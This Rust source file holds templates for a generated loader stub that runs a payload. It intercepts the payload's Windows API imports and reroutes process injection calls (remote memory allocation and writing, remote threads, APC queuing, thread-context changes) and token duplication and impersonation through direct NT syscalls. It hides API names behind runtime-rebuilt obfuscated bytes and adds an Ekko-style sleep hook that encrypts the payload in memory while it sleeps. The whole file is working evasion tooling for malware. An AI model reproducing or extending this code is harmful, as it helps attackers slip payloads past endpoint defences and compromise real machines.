//! Generated stub templates for API resolution.
//!
//! The catalogue and the rendering logic live in [`super`]; this file holds the
//! source injected into the generated stub: the block skeleton, the rebuild and
//! forwarding handlers, and one wrapper per catalogued API.

pub(super) const NOOP_BLOCK: &str = r#"// --- API resolution (build.stub.api_resolution) ---
// No API is proxied: the loader resolves the payload's imports normally.
mod api_resolution {
    /// Nothing is proxied in this build: every import is resolved normally.
    #[allow(dead_code)]
    pub fn resolution_policy(_dll: &str, _func: &str) -> crate::ImportPolicy {
        crate::ImportPolicy::Forward
    }
}
use api_resolution::resolution_policy;
"#;

pub(super) const BLOCK_TEMPLATE: &str = r#"// --- API resolution (build.stub.api_resolution) ---
// The loader serves the selected APIs from a proxy generated here, so the
// intercepted calls leave the payload's IAT and (route_to_nt) reach the kernel
// through the syscall layer. The names are rebuilt at runtime from obfuscated
// bytes; only the comments carry them in clear.
mod api_resolution {
    /// Decides how one payload import slot is served: a generated proxy, the
    /// real export, or a refusal (`unmatched: abort`).
    #[allow(dead_code)]
    pub fn resolution_policy(dll: &str, func: &str) -> crate::ImportPolicy {
        let module = normalize_module(dll);
$POLICY_MATCHES$
        $MISS_DECISION$
    }

    /// Normalizes a module name for comparison: the file-name component, a
    /// trailing `.dll` stripped (case-insensitively), ASCII-lowercased.
    fn normalize_module(name: &str) -> String {
        let base = name.rsplit(['\\', '/']).next().unwrap_or(name);
        let lower = base.to_ascii_lowercase();
        lower.strip_suffix(".dll").unwrap_or(&lower).to_string()
    }

    /// `NtCurrentProcess()`: the `(HANDLE)-1` pseudo-handle.
    #[allow(dead_code)]
    fn current_process() -> windows::Win32::Foundation::HANDLE {
        windows::Win32::Foundation::HANDLE(-1isize as *mut core::ffi::c_void)
    }

    /// Publishes an NTSTATUS failure as the Win32 last error.
    #[allow(dead_code)]
    fn set_last_error(status: i32) {
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
    }

$PROXIES$
}
use api_resolution::resolution_policy;
"#;

pub(super) const WRAPPER_READ_PROCESS_MEMORY: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtReadVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved, partial count kept).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        let status = crate::nt_read_vm(process, base, buffer, size, read);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const REBUILD_OPEN_PROCESS: &str = r#"    /// $COMMENT$: rebuilt on NtOpenProcess (`OBJECT_ATTRIBUTES` + `CLIENT_ID`).
    ///
    /// The Win32 `PROCESS_*` access constants are the NT access masks, so
    /// `desired_access` is passed through unchanged; `inherit` maps to
    /// `OBJ_INHERIT`. Fidelity risk: `OpenProcess` documents `ERROR_INVALID_
    /// PARAMETER` for a zero access mask and `ERROR_ACCESS_DENIED` on refusal;
    /// those come back through `RtlNtStatusToDosError`.
    extern "system" fn $ID$(desired_access: u32, inherit: i32, process_id: u32) -> isize {
        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: *mut core::ffi::c_void,
            object_name: *const core::ffi::c_void,
            attributes: u32,
            security_descriptor: *const core::ffi::c_void,
            security_quality_of_service: *const core::ffi::c_void,
        }
        #[repr(C)]
        struct ClientId {
            unique_process: *mut core::ffi::c_void,
            unique_thread: *mut core::ffi::c_void,
        }

        const OBJ_INHERIT: u32 = 0x0000_0002;
        let attributes = ObjectAttributes {
            length: core::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: core::ptr::null_mut(),
            object_name: core::ptr::null(),
            attributes: if inherit != 0 { OBJ_INHERIT } else { 0 },
            security_descriptor: core::ptr::null(),
            security_quality_of_service: core::ptr::null(),
        };
        let client_id = ClientId {
            unique_process: process_id as usize as *mut core::ffi::c_void,
            unique_thread: core::ptr::null_mut(),
        };
        let mut handle: isize = 0;
        let status = crate::nt_open_process(
            &mut handle as *mut isize as *mut core::ffi::c_void,
            desired_access,
            &attributes as *const ObjectAttributes as *const core::ffi::c_void,
            &client_id as *const ClientId as *const core::ffi::c_void,
        );
        if status >= 0 {
            return handle;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const WRAPPER_VIRTUAL_ALLOC_EX: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtAllocateVirtualMemory
    /// (NTSTATUS -> base pointer, `GetLastError` preserved).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        address: *mut core::ffi::c_void,
        size: usize,
        alloc_type: u32,
        protect: u32,
    ) -> *mut core::ffi::c_void {
        let mut base = address;
        let mut region = size;
        let status = crate::nt_alloc_vm(process, &mut base, 0, &mut region, alloc_type, protect);
        if status >= 0 {
            return base;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        core::ptr::null_mut()
    }
"#;

pub(super) const WRAPPER_WRITE_PROCESS_MEMORY: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtWriteVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved, count kept).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        base: *const core::ffi::c_void,
        buffer: *const core::ffi::c_void,
        size: usize,
        written: *mut usize,
    ) -> i32 {
        let status = crate::nt_write_vm(process, base, buffer, size, written);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const WRAPPER_VIRTUAL_PROTECT_EX: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtProtectVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved, old protection kept).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        base: *mut core::ffi::c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        let status = crate::nt_protect_vm(process, base, size, new_protect, old_protect);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const REBUILD_CREATE_REMOTE_THREAD: &str = r#"    /// $COMMENT$: rebuilt on NtCreateThreadEx (`CREATE_SUSPENDED` translated to
    /// the native flag). `lpThreadAttributes` and `lpThreadId` are not honored:
    /// the native call takes no security attributes and returns no thread id.
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        _attributes: *const core::ffi::c_void,
        stack_size: usize,
        start: *mut core::ffi::c_void,
        parameter: *mut core::ffi::c_void,
        creation_flags: u32,
        _thread_id: *mut u32,
    ) -> isize {
        const WIN32_CREATE_SUSPENDED: u32 = 0x0000_0004;
        const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;
        const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;

        let flags = if creation_flags & WIN32_CREATE_SUSPENDED != 0 {
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED
        } else {
            0
        };
        let mut handle: isize = 0;
        let status = crate::nt_create_thread_ex_native(
            &mut handle as *mut isize as *mut windows::Win32::Foundation::HANDLE,
            THREAD_ALL_ACCESS,
            core::ptr::null(),
            process,
            start,
            parameter,
            flags,
            0,
            stack_size,
            0,
            core::ptr::null(),
        );
        if status >= 0 {
            return handle;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const WRAPPER_QUEUE_USER_APC: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtQueueApcThread
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        routine: *const core::ffi::c_void,
        thread: windows::Win32::Foundation::HANDLE,
        data: usize,
    ) -> u32 {
        let status = crate::nt_queue_apc(
            thread,
            routine,
            data as *mut core::ffi::c_void,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        );
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const WRAPPER_RESUME_THREAD: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtResumeThread (NTSTATUS ->
    /// previous suspend count, `GetLastError` preserved).
    extern "system" fn $ID$(thread: windows::Win32::Foundation::HANDLE) -> u32 {
        let mut previous = 0u32;
        let status = crate::nt_resume_thread(thread, &mut previous);
        if status >= 0 {
            return previous;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        u32::MAX
    }
"#;

pub(super) const WRAPPER_SUSPEND_THREAD: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtSuspendThread (NTSTATUS ->
    /// previous suspend count, `GetLastError` preserved).
    extern "system" fn $ID$(thread: windows::Win32::Foundation::HANDLE) -> u32 {
        let mut previous = 0u32;
        let status = crate::nt_suspend_thread(thread, &mut previous);
        if status >= 0 {
            return previous;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        u32::MAX
    }
"#;

pub(super) const WRAPPER_GET_THREAD_CONTEXT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtGetContextThread
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        thread: windows::Win32::Foundation::HANDLE,
        context: *mut core::ffi::c_void,
    ) -> i32 {
        let status = crate::nt_get_context_thread(thread, context);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const WRAPPER_SET_THREAD_CONTEXT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtSetContextThread
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        thread: windows::Win32::Foundation::HANDLE,
        context: *mut core::ffi::c_void,
    ) -> i32 {
        let status = crate::nt_set_context_thread(thread, context);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const WRAPPER_OPEN_PROCESS_TOKEN: &str = r#"    /// $COMMENT$: rebuilt on NtOpenProcessToken (the Win32 wrapper adds no
    /// object attributes; NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        desired_access: u32,
        token: *mut core::ffi::c_void,
    ) -> i32 {
        let status = crate::nt_open_process_token(process, desired_access, token);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const WRAPPER_DUPLICATE_TOKEN_EX: &str = r#"    /// $COMMENT$: rebuilt on NtDuplicateToken. Win32 carries the requested
    /// impersonation level in an `OBJECT_ATTRIBUTES`/`SECURITY_QUALITY_OF_SERVICE`
    /// pair passed to the native call; `NtDuplicateToken`'s fourth argument is
    /// `EffectiveOnly`, passed as 0 so the duplicate is not filtered. The token
    /// type passes through unchanged (same enum values). `lpTokenAttributes`
    /// supplies `lpSecurityDescriptor`/`bInheritHandle`; its `nLength` is
    /// ignored, as Win32 does.
    extern "system" fn $ID$(
        existing: windows::Win32::Foundation::HANDLE,
        desired_access: u32,
        token_attributes: *const windows::Win32::Security::SECURITY_ATTRIBUTES,
        impersonation_level: i32,
        token_type: i32,
        new_token: *mut core::ffi::c_void,
    ) -> i32 {
        // Same prefix as the native OBJECT_ATTRIBUTES; the pointer fields stay
        // pointer-sized on x86, so `size_of` yields the right Length there too.
        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: *mut core::ffi::c_void,
            object_name: *mut core::ffi::c_void,
            attributes: u32,
            security_descriptor: *mut core::ffi::c_void,
            security_quality_of_service: *mut core::ffi::c_void,
        }

        let mut quality = windows::Win32::Security::SECURITY_QUALITY_OF_SERVICE {
            Length: core::mem::size_of::<windows::Win32::Security::SECURITY_QUALITY_OF_SERVICE>()
                as u32,
            ImpersonationLevel:
                windows::Win32::Security::SECURITY_IMPERSONATION_LEVEL(impersonation_level),
            ContextTrackingMode: windows::Win32::Security::SECURITY_DYNAMIC_TRACKING.0,
            EffectiveOnly: windows::Win32::Foundation::BOOLEAN(0),
        };
        let (attributes, security_descriptor) = if token_attributes.is_null() {
            (0u32, core::ptr::null_mut())
        } else {
            let inherit = unsafe { (*token_attributes).bInheritHandle.0 != 0 };
            (
                if inherit {
                    windows::Win32::System::Kernel::OBJ_INHERIT as u32
                } else {
                    0
                },
                unsafe { (*token_attributes).lpSecurityDescriptor },
            )
        };
        let mut object = ObjectAttributes {
            length: core::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: core::ptr::null_mut(),
            object_name: core::ptr::null_mut(),
            attributes,
            security_descriptor,
            security_quality_of_service: &mut quality as *mut _ as *mut core::ffi::c_void,
        };
        let status = crate::nt_duplicate_token(
            existing,
            desired_access,
            &mut object as *mut ObjectAttributes as *const core::ffi::c_void,
            0,
            token_type,
            new_token,
        );
        if status >= 0 {
            return 1;
        }
        set_last_error(status);
        0
    }
"#;

pub(super) const WRAPPER_IMPERSONATE_LOGGED_ON_USER: &str = r#"    /// $COMMENT$: rebuilt on NtSetInformationThread(ThreadImpersonationToken),
    /// the native shape of ImpersonateLoggedOnUser (NTSTATUS -> BOOL).
    extern "system" fn $ID$(token: windows::Win32::Foundation::HANDLE) -> i32 {
        const THREAD_IMPERSONATION_TOKEN: i32 = 5;

        let status = crate::nt_set_info_thread(
            unsafe { windows::Win32::System::Threading::GetCurrentThread() },
            THREAD_IMPERSONATION_TOKEN,
            &token as *const windows::Win32::Foundation::HANDLE as *const core::ffi::c_void,
            core::mem::size_of::<windows::Win32::Foundation::HANDLE>() as u32,
        );
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

pub(super) const HANDLER_TEMPLATE: &str = r#"    /// $COMMENT$: decides what to return. Catalogue hits get their proxy,
    /// everything else (including ordinals) is forwarded to the original.
    extern "system" fn $PROXY$(module: isize, name: *const u8) -> isize {
        unsafe {
            // A name pointer with a zero high word is an ordinal: forward it.
            if (name as usize) >> 16 != 0 {
                let wanted = std::ffi::CStr::from_ptr(name as *const i8);
                if let Ok(func) = wanted.to_str() {
                    let mut buf = [0u8; 260];
                    let len = windows::Win32::System::LibraryLoader::GetModuleFileNameA(
                        windows::Win32::Foundation::HMODULE(module as *mut core::ffi::c_void),
                        &mut buf,
                    );
                    if len > 0 {
                        let path = String::from_utf8_lossy(&buf[..len as usize]);
                        if let crate::ImportPolicy::Proxy(proxy) = resolution_policy(&path, func) {
                            return proxy as isize;
                        }
                    }
                }
            }
            let target: extern "system" fn(isize, *const u8) -> isize =
                core::mem::transmute($ORIGINAL$());
            target(module, name)
        }
    }

    /// Resolves the original export once.
    fn $ORIGINAL$() -> usize {
        static ORIGINAL: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        *ORIGINAL.get_or_init(|| unsafe {
            let want_dll: String = $DLL_DEF$;
            let want_func: String = $FUNC_DEF$;
            let (Ok(dll), Ok(func)) =
                (std::ffi::CString::new(want_dll), std::ffi::CString::new(want_func))
            else {
                return 0;
            };
            let Ok(module) = windows::Win32::System::LibraryLoader::GetModuleHandleA(
                windows::core::PCSTR(dll.as_ptr() as *const u8),
            ) else {
                return 0;
            };
            match windows::Win32::System::LibraryLoader::GetProcAddress(
                module,
                windows::core::PCSTR(func.as_ptr() as *const u8),
            ) {
                Some(address) => address as usize,
                None => 0,
            }
        })
    }
"#;

pub(super) const FORWARD_TEMPLATE: &str = r#"    /// $COMMENT$: forwards to the original export, resolved at runtime (the
    /// intercepted name is never imported).
    extern "system" fn $PROXY$($PARAMS$) -> $RET$ {
        let original = $ORIGINAL$();
        let target: extern "system" fn($TYPES$) -> $RET$ =
            unsafe { core::mem::transmute(original) };
        target($ARGS$)
    }

    /// Resolves the original export once.
    fn $ORIGINAL$() -> usize {
        static ORIGINAL: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        *ORIGINAL.get_or_init(|| unsafe {
            let want_dll: String = $DLL_DEF$;
            let want_func: String = $FUNC_DEF$;
            let (Ok(dll), Ok(func)) =
                (std::ffi::CString::new(want_dll), std::ffi::CString::new(want_func))
            else {
                return 0;
            };
            let Ok(module) = windows::Win32::System::LibraryLoader::GetModuleHandleA(
                windows::core::PCSTR(dll.as_ptr() as *const u8),
            ) else {
                return 0;
            };
            match windows::Win32::System::LibraryLoader::GetProcAddress(
                module,
                windows::core::PCSTR(func.as_ptr() as *const u8),
            ) {
                Some(address) => address as usize,
                None => 0,
            }
        })
    }
"#;

pub(super) const WRAPPER_VIRTUAL_ALLOC: &str = r#"    /// $COMMENT$: rebuilt on NtAllocateVirtualMemory for the current process.
    ///
    /// `VirtualAlloc` takes the current process implicitly, so the proxy passes
    /// the `(HANDLE)-1` pseudo-handle. `address` stays a hint: the native call
    /// honours a free region there or picks another one, as Win32 does.
    extern "system" fn $ID$(
        address: *mut core::ffi::c_void,
        size: usize,
        alloc_type: u32,
        protect: u32,
    ) -> *mut core::ffi::c_void {
        let mut base = address;
        let mut region = size;
        let status = crate::nt_alloc_vm(
            current_process(),
            &mut base,
            0,
            &mut region,
            alloc_type,
            protect,
        );
        if status >= 0 {
            return base;
        }
        set_last_error(status);
        core::ptr::null_mut()
    }
"#;

pub(super) const WRAPPER_VIRTUAL_PROTECT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtProtectVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        address: *const core::ffi::c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        let status = crate::nt_protect_vm(
            current_process(),
            address as *mut core::ffi::c_void,
            size,
            new_protect,
            old_protect,
        );
        if status >= 0 {
            return 1;
        }
        set_last_error(status);
        0
    }
"#;

pub(super) const WRAPPER_VIRTUAL_FREE: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtFreeVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    ///
    /// `MEM_RELEASE` still requires `size == 0`; the proxy passes both values
    /// through unchanged so the kernel enforces the same contract.
    extern "system" fn $ID$(
        address: *mut core::ffi::c_void,
        size: usize,
        free_type: u32,
    ) -> i32 {
        let mut base = address;
        let mut region = size;
        let status = crate::nt_free_vm(current_process(), &mut base, &mut region, free_type);
        if status >= 0 {
            return 1;
        }
        set_last_error(status);
        0
    }
"#;

pub(super) const WRAPPER_CLOSE_HANDLE: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtClose
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(handle: windows::Win32::Foundation::HANDLE) -> i32 {
        let status = crate::nt_close(handle);
        if status >= 0 {
            return 1;
        }
        set_last_error(status);
        0
    }
"#;

pub(super) const WRAPPER_WAIT_FOR_SINGLE_OBJECT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtWaitForSingleObject
    /// (relative timeout in 100 ns units, `WAIT_*` results preserved).
    ///
    /// `INFINITE` becomes a null timeout. `STATUS_WAIT_0` and `STATUS_TIMEOUT`
    /// share their values with `WAIT_OBJECT_0` and `WAIT_TIMEOUT`, so a success
    /// status is returned unchanged; a failure becomes `WAIT_FAILED` with the
    /// translated Win32 error.
    extern "system" fn $ID$(
        handle: windows::Win32::Foundation::HANDLE,
        milliseconds: u32,
    ) -> u32 {
        let timeout: i64 = if milliseconds == u32::MAX {
            0
        } else {
            -((milliseconds as i64) * 10_000)
        };
        let timeout_ptr: *const i64 = if milliseconds == u32::MAX {
            core::ptr::null()
        } else {
            &timeout as *const i64
        };
        let status = crate::nt_wait_for_single_object_native(handle, 0, timeout_ptr);
        if status >= 0 {
            return status as u32;
        }
        set_last_error(status);
        0xFFFF_FFFF
    }
"#;

pub(super) const WRAPPER_VIRTUAL_QUERY: &str = r#"    /// $COMMENT$: rebuilt on NtQueryVirtualMemory(MemoryBasicInformation) for
    /// the current process. The native class-0 structure is the Win32
    /// `MEMORY_BASIC_INFORMATION`.
    extern "system" fn $ID$(
        address: *const core::ffi::c_void,
        buffer: *mut windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION,
        length: usize,
    ) -> usize {
        let mut returned = 0usize;
        let status = crate::nt_query_vm(
            current_process(),
            address,
            0,
            buffer as *mut core::ffi::c_void,
            length,
            &mut returned as *mut usize,
        );
        if status >= 0 {
            return returned;
        }
        set_last_error(status);
        0
    }
"#;

pub(super) const WRAPPER_CREATE_THREAD: &str = r#"    /// $COMMENT$: rebuilt on NtCreateThreadEx for the current process.
    ///
    /// `lpThreadAttributes` is ignored (the native call takes no security
    /// attributes) and `STACK_SIZE_PARAM_IS_A_RESERVATION` is not honoured:
    /// `stack_size` always becomes the initial stack. `CREATE_SUSPENDED` maps to
    /// `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`. `lpThreadId`, when non-null, is
    /// filled from `ThreadBasicInformation`, because the native call returns no
    /// thread id.
    extern "system" fn $ID$(
        thread_attributes: *const core::ffi::c_void,
        stack_size: usize,
        start: *mut core::ffi::c_void,
        parameter: *mut core::ffi::c_void,
        creation_flags: u32,
        thread_id: *mut u32,
    ) -> windows::Win32::Foundation::HANDLE {
        const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
        const CREATE_SUSPENDED: u32 = 0x0000_0004;
        const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;

        let _ = thread_attributes;
        let mut handle = windows::Win32::Foundation::HANDLE(core::ptr::null_mut());
        let flags = if creation_flags & CREATE_SUSPENDED != 0 {
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED
        } else {
            0
        };
        let status = crate::nt_create_thread_ex_native(
            &mut handle,
            THREAD_ALL_ACCESS,
            core::ptr::null(),
            current_process(),
            start,
            parameter,
            flags,
            0,
            stack_size,
            0,
            core::ptr::null(),
        );
        if status < 0 {
            set_last_error(status);
            return windows::Win32::Foundation::HANDLE(core::ptr::null_mut());
        }
        if !thread_id.is_null() {
            #[repr(C)]
            struct ClientId {
                unique_process: *mut core::ffi::c_void,
                unique_thread: *mut core::ffi::c_void,
            }
            #[repr(C)]
            struct ThreadBasicInformation {
                exit_status: i32,
                teb_base: *mut core::ffi::c_void,
                client_id: ClientId,
                affinity_mask: usize,
                priority: i32,
                base_priority: i32,
            }
            let mut info = ThreadBasicInformation {
                exit_status: 0,
                teb_base: core::ptr::null_mut(),
                client_id: ClientId {
                    unique_process: core::ptr::null_mut(),
                    unique_thread: core::ptr::null_mut(),
                },
                affinity_mask: 0,
                priority: 0,
                base_priority: 0,
            };
            let mut returned = 0u32;
            let query = crate::nt_query_info_thread(
                handle,
                0,
                &mut info as *mut ThreadBasicInformation as *mut core::ffi::c_void,
                core::mem::size_of::<ThreadBasicInformation>() as u32,
                &mut returned,
            );
            if query >= 0 {
                unsafe {
                    *thread_id = info.client_id.unique_thread as usize as u32;
                }
            }
        }
        handle
    }
"#;

pub(super) const WRAPPER_OPEN_THREAD_TOKEN: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtOpenThreadToken
    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
    extern "system" fn $ID$(
        thread: windows::Win32::Foundation::HANDLE,
        access: u32,
        open_as_self: i32,
        token: *mut windows::Win32::Foundation::HANDLE,
    ) -> i32 {
        let status = crate::nt_open_thread_token(
            thread,
            access,
            (open_as_self != 0) as u8,
            token as *mut core::ffi::c_void,
        );
        if status >= 0 {
            return 1;
        }
        set_last_error(status);
        0
    }
"#;

pub(super) const SLEEP_HOOK: &str = r#"    /// $COMMENT$: encrypts the mapped payload while it sleeps.
    ///
    /// Every path that does not obfuscate (a short sleep, `INFINITE`, no
    /// recorded region, a concurrent obfuscated sleep, or an ekko setup
    /// failure) degrades to a real `NtDelayExecution` delay, so the payload
    /// keeps the Win32 contract either way.
    extern "system" fn $ID$(milliseconds: u32) {
        use core::sync::atomic::{AtomicBool, Ordering};

        /// One ekko chain at a time: the chain is not reentrant.
        static CONCEALING: AtomicBool = AtomicBool::new(false);
        const MIN_MS: u32 = $MIN_MS$;
        const MAX_MS: u32 = $MAX_MS$;
        const INFINITE: u32 = 0xFFFF_FFFF;

        fn delay(milliseconds: u32) {
            if milliseconds == INFINITE {
                unsafe {
                    crate::nt_delay_execution(0, core::ptr::null());
                }
                return;
            }
            let timeout: i64 = -((milliseconds as i64) * 10_000);
            unsafe {
                crate::nt_delay_execution(0, &timeout as *const i64);
            }
        }

        if milliseconds == 0
            || milliseconds == INFINITE
            || milliseconds < MIN_MS
            || milliseconds > MAX_MS
        {
            delay(milliseconds);
            return;
        }
        let Some((base, size)) = crate::payload_region::get() else {
            delay(milliseconds);
            return;
        };
        if CONCEALING
            .compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
            .is_err()
        {
            delay(milliseconds);
            return;
        }
        let result = crate::sleep_runtime::ekko_sleep(base, size, milliseconds);
        CONCEALING.store(false, Ordering::Release);
        if result.is_err() {
            delay(milliseconds);
        } else {
            crate::payload_region::record_conceal();
        }
    }
"#;
